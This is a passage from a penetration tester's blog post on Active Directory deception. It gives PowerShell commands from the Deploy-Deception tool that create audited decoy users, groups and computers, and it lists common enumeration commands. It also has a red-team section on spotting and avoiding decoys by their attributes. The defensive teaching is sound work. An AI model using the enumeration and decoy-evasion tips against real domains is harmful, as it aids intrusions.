+<a href="https://3.bp.blogspot.com/-s0FLws0SPNo/W-7S3p1Eg-I/AAAAAAAAE2c/ZRk8FEoSCZcfsOrFfICqrV4FpPjvxuDOwCLcBGAs/s1600/AD_Module_Array.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="776" data-original-width="1600" height="193" src="https://3.bp.blogspot.com/-s0FLws0SPNo/W-7S3p1Eg-I/AAAAAAAAE2c/ZRk8FEoSCZcfsOrFfICqrV4FpPjvxuDOwCLcBGAs/s400/AD_Module_Array.png" width="400" /></a></div>
+There are many benefits like very low chances of detection by AV, very wide coverage by cmdlets (I leave the usage of cmdlets for a later post :P), good filters for cmdlets, signed by Microsoft etc.<br />
+<br />
+I have uploaded a copy of module from Server 2016 on Github: <a href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a><br />
+<br />
+The biggest benefit is that this module works flawlessly in PowerShell Constrained Language Mode (CLM) :)<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-h2Owu8KLP5A/W9nfWFr3y9I/AAAAAAAAE1U/VD11z1nbzEg7Xda89PiQQTofegwyC6boACLcBGAs/s1600/AD_Module_CLM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="438" data-original-width="1600" height="108" src="https://2.bp.blogspot.com/-h2Owu8KLP5A/W9nfWFr3y9I/AAAAAAAAE1U/VD11z1nbzEg7Xda89PiQQTofegwyC6boACLcBGAs/s400/AD_Module_CLM.png" width="400" /></a></div>
+That is all!</div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
+<span itemprop='name'>Nikhil SamratAshok Mittal</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html' itemprop='url'/>
+<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-10-31T22:40:00+05:30'>10:40 PM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html#comment-form' onclick=''>
+No comments:
+    </a>
+</span>
+<span class='post-backlinks post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html#links'>Links to this post</a>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1005506833'>
+<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=7401494977220498300&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell' rel='tag'>Offensive PowerShell</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams' rel='tag'>Offensive PowerShell for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Powershell' rel='tag'>Powershell</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+</div>
+
+          </div></div>
+        
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Tuesday, October 16, 2018</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://4.bp.blogspot.com/-HCDPEOtEkmw/W8CkqiF761I/AAAAAAAAEyE/W6SqwuTALz0hcSiZnnUckEkSkXjdgskNQCLcBGAs/s400/DS_Access_GP.png' itemprop='image_url'/>
+<meta content='8135211063584500909' itemprop='blogId'/>
+<meta content='8408133389804595546' itemprop='postId'/>
+<a name='8408133389804595546'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+<a href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html'>Forging Trusts for Deception in Active Directory</a>
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-8408133389804595546' itemprop='articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on"><div style="text-align: justify;"></div><div style="text-align: justify;">Deception has always been of interest to me. As a student of military history, I have always been fascinated by its implementation in warfare and looked at deception as something which is effective and generally low cost!</div><div style="text-align: justify;">Couple of years back, I got involved in development and extensive testing (from red team perspective) of couple of enterprise deception solutions over a period of many months. In early 2018, during one of my Active Directory classes, a student&nbsp; asked and ultimately hired me (thank you!) for testing three Deception products they were evaluating.&nbsp;</div><div style="text-align: justify;"><br />
+</div><div style="text-align: justify;">With these experiences I realized that most of the focus for deception in Active Directory (AD) has been on honeyuser/honeytokens/honeycredentials. Tools like <a href="https://github.com/secureworks/dcept">dcept</a> and others are popular for this technique. There is a dearth of free and open source deception solutions for AD if we want to utilize deception to detect an adversary during the domain enumeration phase of an attack. That is something which we are going to address soon.<br />
+<br />
+Also, to increase interest and community involvement, I gave a talk on 'Forging Trusts for Deception in Active Directory' at <a href="https://sched.co/FXIf">BruCON</a> couple of weeks back (October 2018). Slides and video are at the end of this post. </div><div style="text-align: justify;"></div><br />
+<h4 style="text-align: justify;">What is Deception?</h4><br />
+<div style="text-align: justify;">Deception is a psychology game. Red teams and adversaries have been using it for so long against unsuspecting users to trick them in opening malicious attachments or clicking on links. Once inside an AD environment, an adversary tries to use credentials of other users and pivot through other machines to mix with the existing logs and traffic.<br />
+<br />
+Blue teams utilize deception by providing service, privileges or information can adversary is looking for. IMHO, blue teams, have an upper hand when it comes to deception, both in terms of psychology and technical controls.<br />
+<br />
+<h4>The attacker psychology&nbsp;</h4>There is a psychological condition called <a href="https://en.wikipedia.org/wiki/Illusory_superiority">Illusive Superiority</a> which applies to most of the adversaries and red teams. They think of themselves as smarter and much more talented than the blue teams. Along with this, the tendency to go for the "lowest hanging fruit" and an urge for getting DA privileges quickly, makes them a fruitful target for deception :)<br />
+<br />
+So, the idea is, defenders show the adversaries what they want to see. For example, a user whose password never expires or a Server 2003 computer.<br />
+<br />
+<h4></h4><h4>Desired properties of a decoy</h4><h4></h4>Taken directly from my slides, desired properties of a decoy:<br />
+<ol><li>Should be desirable enough so that an attacker enumerates the object.</li>
+<li>Should be easily configurable.</li>
+<li>No configuration changes required on endpoints.</li>
+<li>Should not be triggered for normal admin activity. </li>
+</ol>Number 4 above is the hardest to achieve. If we are targeting enumeration, we must make the attacker activity or tools stand-out to avoid false positives.<br />
+<br />
+<h4></h4><h4>Deploying Deception</h4>So, how can we achieve above desired properties with just the built-in tools in AD? We can use Group Policy to set AD Access logging, configure 'interesting' objects and filter out false positives!<br />
+<br />
+The Group Policy setting required for AD Access is Windows Settings | Security Settings | Advanced Audit Policy Configuration | DS Access - Audit Directory Service Access <br />
+<div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-HCDPEOtEkmw/W8CkqiF761I/AAAAAAAAEyE/W6SqwuTALz0hcSiZnnUckEkSkXjdgskNQCLcBGAs/s1600/DS_Access_GP.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img alt="AD Access Group Policy" border="0" data-original-height="631" data-original-width="840" height="300" src="https://4.bp.blogspot.com/-HCDPEOtEkmw/W8CkqiF761I/AAAAAAAAEyE/W6SqwuTALz0hcSiZnnUckEkSkXjdgskNQCLcBGAs/s400/DS_Access_GP.png" title="AD Access Group Policy" width="400" /></a></div>Above setting results in a Security Event 4662 whenever an AD object is accessed. The logging needs to configured at the object level. For that configuration, we need to modify the SACL of the object and add relevant ACEs.<br />
+<br />
+Let's have a look at the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-addauditaccessobjectace">AddAuditAccessObjectAce</a> function to understand ACE:<br />
+<br />
+<div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-IoKDE5iT_AI/W8Cmj8u2_wI/AAAAAAAAEyc/dMIHRDw8NyUp6VA7x-Nqynrrodb1cqsngCEwYBhgL/s1600/ACE.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="583" data-original-width="1569" height="235" src="https://4.bp.blogspot.com/-IoKDE5iT_AI/W8Cmj8u2_wI/AAAAAAAAEyc/dMIHRDw8NyUp6VA7x-Nqynrrodb1cqsngCEwYBhgL/s640/ACE.png" width="540" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div>So, as an example, we can set auditing whenever 'everyone' uses 'ReadProperty' 'success'-fully against a user. This helps in detecting any enumeration against that user.<br />
+<br />
+<h4>Introducing Deploy-Deception </h4>These settings can be done using GUI. But thanks to PowerShell and the ActiveDirectory module, it can be automated.<br />
+<br />
+To automate the setting up of decoy object with interesting attributes and lesser known properties to avoid false positives , I wrote <b>Deploy-Deception</b>. It is a PowerShell module which utilizes the ActiveDirectory module to deploy decoys easily and efficiently. You can find Deploy-Deception on Github here: <a href="https://github.com/samratashok/Deploy-Deception">https://github.com/samratashok/Deploy-Deception</a><br />
+<br />
+<br />
+Let's have a look at setting up of different types of object decoys during different phases of an attack.<br />
+<br />
+<h4>Enumeration - Decoy User Objects</h4>User objects are the most interesting objects&nbsp; Some user properties are of interest for an attacker:<br />
+<ul><li>Password does not expire</li>
+<li>Trusted for Delegation </li>
+<li>Users with SPN</li>
+<li>Password in description</li>
+<li>Users who are members of high privilege groups</li>
+<li>Users with ACL rights over other users, groups or containers </li>
+</ul>We can use Deplou-UserDeception function to create a decoy user. <br />
+Let's create a decoy user 'usermanager' whose password never expires and a 4662 is logged whenever everyone reads any of its properties:<br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\Deploy-Deception\Deploy-Deception.psd1
+PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -Verbose
+</textarea></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-IyWRxYhsL8w/W8HtHE5wbvI/AAAAAAAAEys/ckwTJG0PYWUEZwmeoek9x5Wp8MSdh-rRQCLcBGAs/s1600/user_readall.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="382" data-original-width="1600" height="95" src="https://2.bp.blogspot.com/-IyWRxYhsL8w/W8HtHE5wbvI/AAAAAAAAEys/ckwTJG0PYWUEZwmeoek9x5Wp8MSdh-rRQCLcBGAs/s400/user_readall.png" width="400" /></a></div><br />
+Please note that an actual user objects is created in the domain. Now, the above gets triggered very frequently as we have enabled the default logging for whenever anyone reads any property of the user usermanager. It means a 4662 will be logged even if someone simply lists all the users in the domain. This means, that this decoy will trigger logging for all the possible usage (normal or otherwise) like<br />
+<br />
+net user /domain<br />
+<br />
+Get-WmiObject -Class Win32_UserAccount<br />
+<br />
+Get-ADUser -Filter * (MS ActiveDirectory module)<br />
+<br />
+Get-NetUser (PowerView)<br />
+<br />
+Find Users, Contacts and Groups GUI <br />
+<br />
+That does not look good, right? So we need to find ways to differentiate attacker enumeration from normal activity. There is something very interesting with attacker enumeration tools, they like to extract as much information for an object as possible (which makes sense as you would not like to connect repeatedly to a domain controller). Now, this means that if we turn on auditing for an uncommon attribute, there is a large possibility (yes, possibility - share your false positives with me please :P) that only aggressive enumeration triggers the logging. There are many such attributes, have a look at the <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/attributes-all">List of All Attributes.</a> I liked once such attribute - <a href="https://docs.microsoft.com/en-us/windows/desktop/adschema/a-x500uniqueidentifier">x500uniqueIdentifier</a> (GUID d07da11f-8a3d-42b6-b0aa-76c962be719a)<br />
+<br />
+So, we now remove the ACE we added previously and add a new one which triggers logging only when x500uniqueIdentifier property is read:<br />
+<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;">PS C:\> Deploy-UserDeception -DecoySamAccountName usermanager -RemoveAuditing $true -Verbose
+PS C:\> Deploy-UserDeception -DecoySamAccountName usermanager -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose
+</textarea></pre>This auditing is triggered only by tools like PowerView (or other tools like ADExplorer) which fetches all the attributes of an object. While not perfect, this is a huge improvement. <br />
+<br />
+If you have enough confidence that none of your monitoring or management tools read all the properties of a user object, auditing for properties like SPN can also be set which triggers logging only when SPN (or all attributes) is read. <br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager-spn -Password Pass@123 | Deploy-UserDeception -SPN 'MSSQLSvc/dc' -GUID f3a64788-5306-11d1-a9c5-0000f80367c1 -Verbose 
+</textarea></pre>Still too many logs? The below command logs a 4662 log only when DACL (or all attributes) of the decoy user object is read:<br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName user -UserLastName manager-control -Password Pass@123 | Deploy-UserDeception -UserFlag AllowReversiblePasswordEncryption -Right ReadControl -Verbose 
+</textarea></pre><h4>Enumeration - Decoy Computer Objects</h4>We can also set decoy computer objects. It is possible to create computer objects in domain without having an actual computer mapped to that object. Although, it is always advised to use actual computers or VM for decoy computer objects to avoid identification of decoys.<br />
+<br />
+Some computer object properties which are of interest to an adversary:<br />
+<ul><li>Older Operating Systems</li>
+<li>Interesting SPN</li>
+<li>Delegation Settings</li>
+<li>Membership of privileged groups</li>
+</ul>Let's have a look at some deployment using Deploy-Deception, we can use Deploy-DecoyComputer function. :<br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Create-DecoyComputer -ComputerName revert-web -Verbose | Deploy-ComputerDeception -PropertyFlag TrustedForDelegation -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a  -Verbose 
+</textarea></pre>Above command creates a decoy computer that has Unconstrained Delegation enabled and a 4662 is logged whenever x500uniqueIdentifier or all the attributes of the computer are read.<br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Deploy-ComputerDeception -DecoyComputerName comp1 -PropertyFlag TrustedForDelegation -Right ReadControl -Verbose 
+</textarea></pre>Above command uses an existing computer object and sets Unconstrained Delegation. Logging is triggered whenever DACL or all the attributes of the computer are read.<br />
+<br />
+We can also use <a href="https://www.dcshadow.com/">DCShadow</a> to modify a computer object which appears to be a DC. I briefly touched on this <a href="https://www.labofapenetrationtester.com/2018/04/dcshadow.html">here</a>. More on this particular topic some other day.<br />
+<br />
+<h4>Enumeration - Decoy Group Objects</h4>We can also deploy decoy Group objects. What properties of a group are interesting to an adversary?<br />
+<ul><li>Interesting name (containing words like admins, administrators etc.) </li>
+<li>Members of the group are also member of high privileged groups or have 'interesting' user attributes.&nbsp;</li>
+<li>Membership of a high privilege group. </li>
+</ul><br />
+Groups provide interesting opportunities. We can make decoy users member of a decoy group thus creating 'layered' decoys. This way we get logs both when membership of the decoy group is listed and when attributes of the decoy user are listed. We will see soon how to use Logon restrictions to avoid mis-use of privileges of a user.<br />
+<br />
+So in the below command, we create a decoy user 'dnsmanager' whose password never expires with logging when an obscure property is read, create a group with name 'Forest Admins', make dnsmanager part of the forest admins group and add the forest admins group to the built-in dnsadmins group. Logging is triggered when membership of the group is read. We can use Deploy-GroupDeception for this:<br />
+<pre><textarea cols="70" readonly="readonly" rows="7" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName dns -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose 
+
+PS C:\> Create-DecoyGroup -GroupName 'Forest Admins' -Verbose | Deploy-GroupDeception -AddMembers dnsmanager -AddToGroup dnsadmins -GUID bc0ac240-79a9-11d0-9020-00c04fc2d4cf -Verbose 
+</textarea></pre><br />
+<h4>Enumeration and Lateral Movement - Privileged Decoy User Objects</h4>We can also deploy high privilege user decoys to target both enumeration and lateral movement. We can create decoy users which have high privileges like membership of domain admins, rights to execute DCSync etc.<br />
+<br />
+Now, the risk with having decoy users with such high privileges is if such a user gets compromised, its privileges can be abused. To avoid that,&nbsp; we can use couple of protections:<br />
+<ul><li>Set the Logon Workstation to a non-existent machine</li>
+<li>Deny logon to the user. </li>
+</ul>In both the above cases, AFAIK, user privileges cannot be used as the decoy user cannot logon to any box with any type of credential like password, hash etc.<br />
+<br />
+Armed with this knowledge, let's create high privilege user decoys using Deploy-PrivilegedUserDeception :<br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection DenyLogon -Right ReadControl -Verbose 
+</textarea></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-2XAOtYDoLzo/W8WLxJUtzqI/AAAAAAAAEy8/waK0OhkCLlMNbkTyXdSYYT3DEBlyYlgTgCLcBGAs/s1600/privilege_userdeception.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="395" data-original-width="1600" height="97" src="https://4.bp.blogspot.com/-2XAOtYDoLzo/W8WLxJUtzqI/AAAAAAAAEy8/waK0OhkCLlMNbkTyXdSYYT3DEBlyYlgTgCLcBGAs/s400/privilege_userdeception.png" width="400" /></a></div>The above command creates a user called 'decda' who is a part of the Domain Admins but cannot logon to any machine. Any attempt to list DACL of the user or list all attributes results in a 4662 log.<br />
+<br />
+For the lateral movement part, we have used the DenyLogon protection. That means even if the user's password or hash or keys are compromised, it will not be possible to reuse those credentials. To get meaningful logs when credentials of such a user are used, we must enable the following Group Policy:<br />
+Configuration|Windows Settings|Security Settings|Advanced Audit Policy Configuration|Audit Policies|Account Logon | Audit Kerberos Authentication Service | Failure<br />
+<div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-alxw5nkpzEw/W8WNL6BimkI/AAAAAAAAEzI/bjiYvTWUE-MHFvL1RIkQovPUrOeuwv1uQCLcBGAs/s1600/GP_Kerberos.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="615" data-original-width="1031" height="237" src="https://3.bp.blogspot.com/-alxw5nkpzEw/W8WNL6BimkI/AAAAAAAAEzI/bjiYvTWUE-MHFvL1RIkQovPUrOeuwv1uQCLcBGAs/s400/GP_Kerberos.png" width="400" /></a></div>This is how the failure looks like in GUI.<br />
+<div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-08o12_9YWs8/W8WY1un7MuI/AAAAAAAAEzU/ywVEWm9T1MUF1hS0j9dynd3w_T9toJoYgCLcBGAs/s1600/Faliure.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="511" data-original-width="569" height="286" src="https://1.bp.blogspot.com/-08o12_9YWs8/W8WY1un7MuI/AAAAAAAAEzU/ywVEWm9T1MUF1hS0j9dynd3w_T9toJoYgCLcBGAs/s320/Faliure.png" width="320" /></a></div>And a 4768 (Failure) is logged on the Domain Controller. In case of attacks like OverPass-The-Hash no such verbose error is returned.<br />
+<br />
+Another option is to set LogonWorkstation to a nonexistent machine. It always makes sense to use a name similar for the workstation that is similar to your actual machines. <br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception-Technique DCSyncRights -Protection LogonWorkStation revert-webserver1 -Right ReadControl -Verbose
+</textarea></pre>Above command creates a decoy user call 'decda', provides it with DCSync permissions and sets the LogonWorkStation to a non-existent machine. If the users credentials are compromised and re-used the error would exactly be the same as in case of DenyLogon and a 4768 is logged.<br />
+<br />
+Both the protections can be used with a non-DA account as well. IMHO, this is better than leaving wrong passwords or hashes in memory (which is a well known technique).<br />
+<br />
+This technique can always be coupled with others. For example,when targeting lateral movement, one of the easier ways to let an adversary 'retrieve' credentials for a decoy user is to use the -PasswordInDescription option of Deploy-UserDeception. Then, we can make that user a privileged user and use one of the protections discussed above:<br />
+<pre><textarea cols="70" readonly="readonly" rows="6" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser  -UserFirstName new -UserLastName da -Password Pass@123 | Deploy-UserDeception -PasswordInDescription 'The new password is Pass@123' -Verbose
+
+PS C:\> Deploy-PrivilegedUserDeception -DecoySamAccountName newda -Technique DomainAdminsMemebership -Protection DenyLogon -Right ReadControl -Verbose
+</textarea></pre></div><div style="text-align: justify;">The first command above creates a newuser called 'newda', sets the string 'The new password is Pass@123' as its description. The second command makes newda a member of the domain admins group, denies logon to the user and configures auditing whenever DACL or all attributes of newda are read.<br />
+<br />
+No special tools are required to get the password from description! Remember targeting 'go for the lowest hanging fruit' ;)<br />
+<br />
+While discussing users with privileges, there is another important aspect that must be discussed. It is about ACLs. A user which have interesting permissions over another user is always of interest to an attacker. (Side note: Make sure that you ACL auditing is a part of your security methodology - both for <a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">domain objects</a> and <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">other</a> <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">securables</a>).<br />
+<br />
+We can use Deploy-SlaveDeception to deploy decoy users where one of the users have FullControl/GenericAll rights over other user. This is interesting for an attacker and can be used to target both enumeration and lateral movement phase. <br />
+<br />
+To target enumeration, following can be used:<br />
+<pre><textarea cols="70" readonly="readonly" rows="9" style="background-color: #012456; color: white;">PS C:\> Create-DecoyUser -UserFirstName master -UserLastName user -Password Pass@123 | Deploy-UserDeception -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose
+
+PS C:\> Create-DecoyUser -UserFirstName slave -UserLastName user -Password Pass@123 | Deploy-UserDeception -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose
+
+PS C:\> Deploy-SlaveDeception -SlaveSamAccountName slaveuser -DecoySamAccountName masteruser -Verbose 
+</textarea></pre>The first and second command above, create users masteruser and slaveuser respectively and set auditing only when an obscure attribute is read. The third command provides masteruser GenericAll rights over slaveuser. Any adversary enumerating or scanning interesting ACLs in your domain will trigger 4662 for both the objects. <br />
+<br />
+<br />
+To target lateral movement, we can use PasswordInDescription option for masteruser or leave its credentials using other popular methods without any protection. We are ready to risk masteruser to be compromised and used (Please carefully consider risks before doing that). If masteruser modifies DACL of slaveuser we get a 4662 log in addition to any other alerts that are triggered whenever a honeytoken/honeyuser is used: <br />
+<pre><textarea cols="70" readonly="readonly" rows="10" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName master -UserLastName user -Password Pass@123
+
+PS C:\> Create-DecoyUser -UserFirstName slave -UserLastName user -Password Pass@123
+
+PS C:\> Deploy-SlaveDeception -SlaveSamAccountName slaveuser -DecoySamAccountName masteruser -Verbose
+
+PS C:\> Deploy-UserDeception -DecoySamAccountName slaveuser -Principal masteruser -Right WriteDacl -Verbose 
+</textarea></pre>In the above command, a 4662 is logged only when masteruser changes DACL of slaveuser.<br />
+<br />
+<h4>Enumeration - Domain and Forest Trust objects</h4>Yet to be automated! There are many interesting possibilities though! For example, we can have a decoy forest trust (let's call it blue forest :P) where we can allow enumeration of users, computers and groups but deny access to any other resource. This can be achieved by setting up a forest trust with Selective Authentication where "Allowed to Authenticate" is set only on the DC but no other machine. This will allow an adversary to enumerate objects but they cannot access resources on other computers.<br />
+<br />
+<h4></h4><h4>Red Team Revenge - Identifying Deception</h4>So how do red teams identify which objects are actual and which are traps or decoys? As I mentioned in the beginning of the post, I have tested multiple Deception solutions over past months. There are multiple Enterprise solutions that use objects which can be identified by looking at their attributes. Some of such attributes:<br />
+<br />
+<ul><li><b>objectSID </b>- This object must always have DomainSID-RID format. Some enterprise solutions mess that up. If you find an object whose SID does not contain the domain SID. Make sure you investigate that object carefully. </li>
+<li><b>lastLogon, lastlogontimestamp </b>- User decoys can be identified by looking at these attributes. If there is a user that too high privileged one who has never logged on (lastLogon set to 31/12/1600 which is before the 'zero' date for LargeInteger datetime), there are good chances that it is a decoy.&nbsp; </li>
+<li><b>logonCount</b> - Although not as good as lastLogon, logonCount is also a good indicator.</li>
+<li><b>whenCreated</b> - Coupled with lastLogon and logonCount, this becomes a good indicator. A user which is old but has never logged-on could be a decoy. You may like to notice that it may also be a dormant user, to be sure have a look at other attributes. </li>
+<li><b>badPwdCount,badPasswordTime</b> - Ever seen a human user who will not fat-finger their password? A user with 0 Badpwdcount (and other bad password attributes) is a good indicator of a decoy.&nbsp;</li>
+<li><b>Too many attributes </b>- Some enterprise solutions fill up ALL or way too many possible attributes for an object. This can also be easily spotted.&nbsp;</li>
+</ul>The best way is to match an object with a well known 'good' object. For example, if you suspect that a computer object in a list of all computers in the domain is a decoy compare it with the properties of the domain controller or attributes of your own foothold machine. The actual dc is always listed in the logonserver environment variable. For user object, the built-in DA always has RID 500. Compare its attributes with a user object you suspect of being decoy.<br />
+<br />
+For multiple solutions which relied on not creating actual objects in the domain, using WMI to retrieve domain information shows correct objects and not the fake ones. <br />
+<br />
+<h4>Red Team Revenge - Avoiding Deception</h4>(Taken directly from my slides) Red Teams need to change their approach and their psychology of illusive superiority to avoid deception:<br />
+<ul><li>Please stop going for the lowest hanging fruit. Enterprise networks are mess but if something looks to good to be true, investigate carefully!</li>
+<li>Avoid automated enumeration tools unless you absolutely know what they are doing in the background. </li>
+<li>I have been urging this in my talks (on ATA) and trainings - Avoid the urge to go for the DA privileges so that you can brag about it in the reports! Focus on goals of your operation. </li>
+</ul><h4>Blue Teams - Avoiding identification</h4>If actual domain objects are used chances of identification are decreased. For example, a computer object which is not mapped to an actual computer has much higher chances of getting identified.<br />
+<br />
+For user decoys, as discussed earlier, having at least one logon session decreases the chances of identification. Let's test this one out.<br />
+<br />
+Let's have a look at a simple example. There is a well known deception identification script called <a href="https://github.com/JavelinNetworks/HoneypotBuster">HoneypotBuster</a>. Let's create a decoy DA and run the script:<br />
+<br />
+<div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-Q40aD_Sn8xc/W8Xv68vAAaI/AAAAAAAAEzg/B0_loptV6CIoYXrcgpFUnnHxNUtFkJvvACLcBGAs/s1600/honeypotbuster-detection.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="631" data-original-width="1181" height="212" src="https://3.bp.blogspot.com/-Q40aD_Sn8xc/W8Xv68vAAaI/AAAAAAAAEzg/B0_loptV6CIoYXrcgpFUnnHxNUtFkJvvACLcBGAs/s400/honeypotbuster-detection.png" width="400" /></a></div>Our decoy DA was detected. Deploy-PrivilegedUserDeception has an option 'CreateLogon'. This parameter starts and stops calculator on the DC with the decoy DA user which populates the logon related properties of the user. To use this parameter, the LogonWorkstation protection must be set to the DC where the module is being executed. You can always change the behavior of the user later.<br />
+<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;"> PS C:\> Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection LogonWorkStation -LogonWorkStation revert-dc -CreateLogon -Verbose 
+</textarea></pre>The above command creates decda, makes it a member of the Domain Admins group, restricts logon to the DC and creates a logon session (which also creates a profile on the DC). Now, if we run Honeypot Buster<br />
